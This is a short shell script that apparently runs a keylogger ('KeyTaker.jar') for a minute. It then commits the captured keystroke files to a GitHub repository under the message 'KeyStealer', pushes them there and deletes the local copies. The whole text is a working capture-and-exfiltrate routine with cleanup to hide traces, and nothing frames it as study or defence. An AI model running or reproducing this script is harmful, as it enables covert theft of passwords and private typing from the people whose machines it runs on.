java -jar KeyTaker.jar & sleep 60 ; kill $!
git remote set-url origin https://github.com/Menge456/KeyListenerStuff
cd keys
git add Keys***.txt
git commit -m "KeyStealer"
git push origin
rm -f Keys***.txt
